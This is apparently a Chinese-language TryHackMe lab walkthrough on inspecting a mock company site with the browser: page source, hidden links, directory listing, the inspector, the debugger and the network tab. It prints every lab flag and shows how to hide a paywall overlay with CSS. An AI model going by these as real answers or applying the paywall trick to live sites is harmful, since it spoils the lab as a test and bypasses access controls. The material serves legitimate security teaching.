<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">此页面包含 Acme IT Support 对其员工的公司照片所做处理的摘要。</span><br><span class="line"></span><br><span class="line">此页面包含公司最近发布的新闻文章列表，每篇新闻文章都有一个带有id号的链接，即/news/article?id=1</span><br><span class="line"></span><br><span class="line">显示单个新闻文章。有些文章似乎被阻止并且仅为高级客户保留访问权限。</span><br><span class="line"></span><br><span class="line">此页面包含客户联系公司的表格。它包含姓名、电子邮件和消息输入字段以及一个发送按钮。</span><br><span class="line"></span><br><span class="line">此链接重定向到 /customers/login。</span><br><span class="line"></span><br><span class="line">此页面包含一个带有用户名和密码字段的登录表单。</span><br><span class="line"></span><br><span class="line">此页面包含一个用户注册表单，其中包含用户名、电子邮件、密码和密码确认输入字段。</span><br><span class="line"></span><br><span class="line">带有电子邮件地址输入字段的密码重置表单。</span><br><span class="line"></span><br><span class="line">此页面包含提交给 IT Support 公司的用户工单列表和“创建工单”按钮。</span><br><span class="line"></span><br><span class="line">此页面包含一个带有用于输入 IT 问题的文本框的表单和一个用于创建 IT Support业务票据的文件上传选项。</span><br><span class="line"></span><br><span class="line">此页面允许用户编辑他们的用户名、电子邮件和密码。</span><br><span class="line"></span><br><span class="line">此链接将允许用户从客户区注销（登出）。</span><br></pre></td></tr></table></figure></div>

<h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h2><p>网页源代码是每次我们发出请求时从 Web 服务器返回给我们的浏览器&#x2F;客户端的可读代码。</p>
<p>返回的代码由 HTML（超文本标记语言）、CSS（级联样式表）和 JavaScript 组成，它告诉我们的浏览器要显示什么内容，以及如何显示它并添加与 JavaScript 交互的元素。</p>
<p>查看网页源代码可以帮助我们发现有关 Web 应用程序的更多信息。</p>
<p><strong>如何查看网页源代码？</strong></p>
<ol>
<li><p>在浏览网站时，你可以右键单击当前网页，然后你会在菜单上看到一个显示“查看页面源”的选项。</p>
</li>
<li><p>大多数浏览器都支持将 <code>view-source:</code> 放在 URL 前面以显示网页源码，例如 <code>view-source:https://www.google.com/</code></p>
</li>
<li><p>在你的浏览器菜单中，你可以找到一个查看页面源代码的选项，此选项有时可以在子菜单中显示，例如开发者工具或更多工具。</p>
</li>
</ol>
<p><strong>让我们查看一些网页源代码！</strong></p>
<p>尝试查看 Acme IT Support 网站（目标站点）主页的页面源代码。 不幸的是，解释你在这里看到的一切都超出了本文的范围，你需要研究网站设计&#x2F;开发课程才能完全理解它。 我们能做的，就是挑选一些对我们很重要的信息。</p>
<p>在源代码页面的顶部，你会注意到一些以 <code>&lt; !- -</code>开头并以<code>- - &gt;</code>  结尾的代码，这些是注释。 源代码中的评论是网站开发者留下的信息，通常是为了向其他程序员解释代码中的某些内容，甚至是给自己的注释&#x2F;提醒，这些评论不会显示在实际网页上。 我们可以看到此评论描述了开发者在开发新主页时是如何选择临时主页的，在本次实验环境下，你可以查看此评论中的网页以获得<strong>第一个flag</strong>。</p>
<p>HTML 中不同页面的链接会写在锚标记中（以 <code>&lt;a</code> 开头的 HTML 元素），你将被定向到 存储在<code>href</code>属性中的链接。</p>
<p>例如，你将在网页源码的第 31 行看到contact 页面链接：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112100241526.png"
                      alt="image-20221112100241526"
                ></p>
<p>（在本次实验环境下）如果你进一步查看网页源代码，则能发现一个以“<code>secr</code>”开头的页面的隐藏链接，你可以查看此链接以获取<strong>第二个flag</strong>。 你显然不会在现实环境下获得flag，但通过查看隐藏链接 你可能会发现一些企业用于存储公司&#x2F;员工&#x2F;客户信息的私人区域。</p>
<p>在网页源代码中可以使用 HTML 代码包含一些外部文件，如 CSS、JavaScript 和图像。在此示例中，你会注意到这些外部文件都存储在同一个目录中。如果你可以在 Web 浏览器中查看此目录，则意味着目标网站出现了配置错误。因为正常情况下，此目录页面应该显示为空白页面或 403 禁止页面，还将显示一个你无权访问该目录的错误提示。</p>
<p>我们可以看到示例中的目标站点已启用目录列表功能，并且我们可以看到 相关页面已经列出了目录中的每个文件。有时候目录中的所有文件都可以安全地被公众查看，但在某些情况下，备份文件、源代码或其他机密信息（这类文件不应该被公众查看到）也可能会存储在该目录中。</p>
<p>在本例中，我们能够在目录中发现 flag.txt 文件，并可查看其内容以获取<strong>第三个flag</strong>。</p>
<p>如今，许多网站都不是从零开始制作的，而是使用所谓的框架来进行网站开发。 网站框架是预制代码的集合，开发人员可以轻松地使用网站框架包含网站所需的常见功能，例如博客、用户管理、表单处理等，从而节省开发人员数小时或数天的开发时间。</p>
<p>查看网页源代码通常可以为我们提供有关网站所使用框架的线索，如果使用了框架，那么是使用哪个框架，框架版本又是什么。目标网站所使用的框架及其版本可能是一个重要的信息，因为目标网站可能没有使用最新版本的框架，而当前使用的框架版本中可能存在一些已经公开的漏洞。</p>
<p>（在本次实验环境下）查看源码页面底部，你会找到有关目标站点正在使用的框架和版本的评论以及指向该框架网站的链接。 查看框架相关的网站，你会发现我们的目标网站使用的框架实际上已经过时了，阅读更新通知并使用你找到的信息来发现<strong>第四个flag</strong>。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112102307094.png"
                      alt="image-20221112102307094"
                ></p>
<p>启动目标机器，然后访问目标站点，并完成答题：<a class="link"   href="https://10-10-37-231.p.thmlabs.com/" >https://10-10-37-231.p.thmlabs.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>右键单击目标站点主页页面，在菜单上点击“查看页面源”选项，浏览网页源代码页面顶部，查看注释评论中的网页以获得<strong>第一个flag</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112103931186.png"
                      alt="image-20221112103931186"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104157944.png"
                      alt="image-20221112104157944"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104223634.png"
                      alt="image-20221112104223634"
                ></p>
<blockquote>
<p>THM{HTML_COMMENTS_ARE_DANGEROUS}</p>
</blockquote>
<p>进一步查看网页源代码，发现一个以“<code>secr</code>”开头的页面的隐藏链接，查看此链接以获取<strong>第二个flag</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104334672.png"
                      alt="image-20221112104334672"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104437721.png"
                      alt="image-20221112104437721"
                ></p>
<blockquote>
<p>THM{NOT_A_SECRET_ANYMORE}</p>
</blockquote>
<p>外部文件都存储在同一个目录中，你可以尝试在 Web 浏览器中查看此目录，在目录中发现 flag.txt 文件，查看其内容以获取<strong>第三个flag</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104644170.png"
                      alt="image-20221112104644170"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104710153.png"
                      alt="image-20221112104710153"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112104743468.png"
                      alt="image-20221112104743468"
                ></p>
<blockquote>
<p>THM{INVALID_DIRECTORY_PERMISSIONS}</p>
</blockquote>
<p>查看源码页面底部，找到有关目标站点正在使用的框架和版本的评论以及指向该框架网站的链接。 查看框架相关的网站，阅读更新通知找到<strong>第四个flag</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112105144595.png"
                      alt="image-20221112105144595"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112105234523.png"
                      alt="image-20221112105234523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112105446889.png"
                      alt="image-20221112105446889"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112105644716.png"
                      alt="image-20221112105644716"
                ></p>
<blockquote>
<p>THM{KEEP_YOUR_SOFTWARE_UPDATED}</p>
</blockquote>
<h2 id="Developer-Tools-Inspector（检查器）"><a href="#Developer-Tools-Inspector（检查器）" class="headerlink" title="Developer Tools - Inspector（检查器）"></a>Developer Tools - Inspector（检查器）</h2><p><strong>Developer Tools（开发者工具）</strong></p>
<p>每个现代浏览器都包含开发者工具，这是一个工具包，能用于帮助 Web 开发人员调试 Web 应用程序，并帮助你窥视网站的底层，以了解网站正在发生的事情。 作为一名渗透测试者，我们可以利用这些工具来更好地理解 Web 应用程序。 我们主要关注开发者工具包的三个功能点：Inspector、Debugger 和 Network。</p>
<p><strong>Opening Developer Tools（打开开发者工具）</strong></p>
<p>每个浏览器访问开发者工具的方式都不同。 </p>
<p><em>Firefox</em></p>
<p>要在 Firefox 中打开开发者工具，请单击浏览器右上角的 Firefox 菜单，然后选择 Web Developer，然后在子菜单中选择 Web Developer Tools 即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112110846518.png"
                      alt="image-20221112110846518"
                ></p>
<p><em>Chrome</em></p>
<p>要在 Chrome 中打开开发者工具，请单击浏览器右侧的 Chrome 菜单，然后选择更多工具，然后选择开发者工具即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112110913058.png"
                      alt="image-20221112110913058"
                ></p>
<p><em>Safari</em></p>
<p>要在 Safari 中打开开发人员工具，你首先需要启用开发菜单。在 Safari 打开首选项中，单击高级选项卡，然后勾选底部标记为在菜单栏中显示开发菜单的复选框。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112110940413.png"
                      alt="image-20221112110940413"
                ></p>
<p>在Safari 浏览器顶部，你现在将拥有“开发”菜单，单击“显示 Web 检查器”以打开开发者工具即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112111002516.png"
                      alt="image-20221112111002516"
                ></p>
<p><em>Edge</em></p>
<p>要在 Microsoft Edge 中打开开发人员工具，请单击浏览器右侧的 Edge 菜单，然后选择更多工具，然后选择开发人员工具即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112111034014.png"
                      alt="image-20221112111034014"
                ></p>
<p><em>Internet Explorer</em></p>
<p>要在 Internet Explorer 中打开开发人员工具，请单击浏览器右侧的 cog 菜单，然后选择 F12 Developer Tools即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112111110269.png"
                      alt="image-20221112111110269"
                ></p>
<p><strong>Inspector（检查器）</strong></p>
<p>页面源代码并不总是代表网页上将显示的内容，这是因为 CSS、JavaScript 和用户交互可以改变网页页面的内容和样式，这意味着我们需要一种方法来查看此时浏览器窗口中显示的内容，而 Element 检查器可以通过为我们提供当前网站网页上的实时显示内容来协助我们。</p>
<p>除了查看实时视图，我们还可以编辑页面元素并与之交互，这有助于 Web 开发人员调试问题。在 Acme IT Support 网站上（目标示例站点），单击新闻部分，你将在其中看到三篇新闻文章。</p>
<p>前两篇文章是可读的，但第三篇被阻止阅读，其内容上方有一条浮动通知，提示你必须是高级客户才能查看该文章。 这些阻止页面内容的浮动框通常被称为付费墙，因为该网站在你希望看到的内容前面设置了一堵隐喻性的墙，直到你付费为止。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112111930439.png"
                      alt="image-20221112111930439"
                ></p>
<p>右键单击高级通知 ( 高级通知即paywall )，你应该能够从菜单中选择 Inspect 选项，这将根据你使用浏览器种类或偏好在底部或右侧打开开发者工具，然后你将看到构成网站的elements(元素)&#x2F;HTML（类似于下面的屏幕截图）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112112220176.png"
                      alt="image-20221112112220176"
                ></p>
<p>找到具有<code>premium-customer-blocker</code>类 的 <code>DIV</code> 元素并单击它。你将在样式框中看到适用于该元素的所有 CSS 样式，例如<code>margin-top: 60px</code>和<code>text-align: center</code>。</p>
<p>我们感兴趣的样式是<code>display: block</code>。 如果我们单击单词<code>block</code>，则可以键入自己选择的值，尝试输入 <code>none</code>，这将使得之前的浮动框消失，并显示其下方的内容和<strong>一个flag</strong> 。如果该元素没有显示字段，你可以在最后一个样式下方单击并添加自己的样式。</p>
<p>试一试元素检查器，你会发现你可以更改网站上的任何信息，包括内容。请记住，这仅在你的浏览器窗口中进行编辑，当你按下刷新时，你在浏览器中正在查看的网页的一切内容都会恢复正常。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112113111494.png"
                      alt="image-20221112113111494"
                ></p>
<p>启动目标机器，然后访问目标站点，并完成答题：<a class="link"   href="https://10-10-125-101.p.thmlabs.com/" >https://10-10-125-101.p.thmlabs.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>浏览目标示例站点，单击新闻部分，第三篇被阻止阅读，其内容上方有一条浮动通知。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112113834680.png"
                      alt="image-20221112113834680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112113904472.png"
                      alt="image-20221112113904472"
                ></p>
<p>右键单击浮动通知，从菜单中选择 Inspect 选项，你将看到构成网站的elements(元素)&#x2F;HTML。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112114012933.png"
                      alt="image-20221112114012933"
                ></p>
<p>修改<code>block</code>的值为<code>none</code>，查看第三篇新闻文章的内容并获取flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112114237841.png"
                      alt="image-20221112114237841"
                ></p>
<blockquote>
<p>THM{NOT_SO_HIDDEN}</p>
</blockquote>
<h2 id="Developer-Tools-Debugger（调试器）"><a href="#Developer-Tools-Debugger（调试器）" class="headerlink" title="Developer Tools - Debugger（调试器）"></a>Developer Tools - Debugger（调试器）</h2><p><strong>Debugger（调试器）</strong></p>
<p>开发者工具中的这个面板是用来调试 JavaScript 的，对于想要弄清楚为什么有些东西可能不工作的 Web 开发者来说，这是一个很好的功能；但作为渗透测试人员，它为我们提供了深入挖掘 JavaScript 代码的选项。在 Firefox 和 Safari 中，此功能称为<code>Debugger</code>，但在 Google Chrome 中，它被称为<code>Sources</code>。</p>
<p>在 Acme IT Support 网站（目标站点）上，单击 contact 页面，每次加载页面时，你可能会注意到屏幕上会有快速闪烁的红色。 我们将使用调试器来确定这个红色闪光是什么以及它是否包含任何有趣的内容。调试这个红点并不会是你在现实世界中作为渗透测试人员会做的事情，该示例只是允许我们了解<code>Debugger</code>功能。</p>
<p>在浏览器的左侧，你会看到当前网页正在使用的所有资源的列表。单击资产（assets ）文件夹，你将看到一个名为 <code>flash.min.js</code> 的文件，继续单击此文件将显示此 JavaScript 文件的内容。</p>
<p>在浏览器中查看 javascript 文件时，你可能会注意到所有内容都在一行上，因为它已被最小化，这意味着所有格式（制表符、间距和换行符）都已被删除以使文件更小。 这个js文件也不例外，而且它被混淆了，这使得它很难被阅读，以保证它不能被其他开发者轻易复制。</p>
<p>我们可以通过使用“Pretty Print”选项对js的内容应用格式，这个功能选项的标志像两个大括号 <code>&#123; &#125;</code> ，它能使js文件更具可读性。滚动到 <code>flash.min.js</code> 文件的底部，你将看到以下行：<code>flash[&#39;remove&#39;]();</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112120411788.png"
                      alt="image-20221112120411788"
                ></p>
<p>这行JS代码就是当前网页会出现红色闪烁的原因。 我们可以利用调试器的另一个特性，这个特性被称为断点，我们可以利用断点 强制浏览器停止执行 JavaScript 并暂停至当前已经执行到的的代码点。</p>
<p>单击上述关键js代码的行号，你会注意到它变为蓝色，这表示你现在已经在这一行插入了一个断点。 现在尝试刷新页面，你会注意到红色框停留在页面上而不是消失，并且其中还包含一个flag。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112120857186.png"
                      alt="image-20221112120857186"
                ></p>
<p>浏览目标站点，进入contact 页面，打开调试器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112121123899.png"
                      alt="image-20221112121123899"
                ></p>
<p>使用“Pretty Print”选项对js的内容应用格式，这个功能选项的标志像两个大括号 <code>&#123; &#125;</code> ，它能使js文件更具可读性：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112121312210.png"
                      alt="image-20221112121312210"
                ></p>
<p>滚动到 <code>flash.min.js</code> 文件的底部，在<code>flash[&#39;remove&#39;]();</code>处设置一个断点（点击该代码的行号即可设置断点）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112121700362.png"
                      alt="image-20221112121700362"
                ></p>
<p>刷新网页页面，查看flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112121748837.png"
                      alt="image-20221112121748837"
                ></p>
<blockquote>
<p>THM{CATCH_ME_IF_YOU_CAN}</p>
</blockquote>
<h2 id="Developer-Tools-Network（网络）"><a href="#Developer-Tools-Network（网络）" class="headerlink" title="Developer Tools - Network（网络）"></a>Developer Tools - Network（网络）</h2><p><strong>Network（网络）</strong></p>
<p>开发者工具上的网络选项卡可用于跟踪网页发出的每个外部请求。 如果你在开发者工具栏中单击“网络”选项卡，然后刷新页面，你将看到有关该页面请求的所有文件。</p>
<p>尝试在目标站点的 contact 页面上执行此操作，如果列表的内容有点繁杂，你可以按垃圾桶图标清除列表。</p>
<p>在网络选项卡打开的情况下，尝试在网页上填写联系表格并按下发送消息按钮，你会注意到网络选项卡中会出现一个相关的事件，该事件会包含一个在后台使用称为 AJAX 的方法提交的表单。 AJAX 是一种在 Web 应用程序后台发送和接收网络数据的方法，通过更改当前网页无法进行干扰。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112122434790.png"
                      alt="image-20221112122434790"
                ></p>
<p>当使用网页创建并发送contact 表单之后，检查在网络选项卡中出现的新的相关条目，通过查看数据发送之后的响应消息以显示flag。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112122641084.png"
                      alt="image-20221112122641084"
                ></p>
<p>浏览目标站点的 contact 页面，打开开发者工具的网络选项卡，清除列表内容，创建新的contact 表单并点击发送：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112123858951.png"
                      alt="image-20221112123858951"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112124109287.png"
                      alt="image-20221112124109287"
                ></p>
<p>查看在网络选项卡中出现的和contact 表单相关的新条目，查看响应消息以获取flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112124445374.png"
                      alt="image-20221112124445374"
                ></p>
<blockquote>
<p>THM{GOT_AJAX_FLAG}</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
</search>
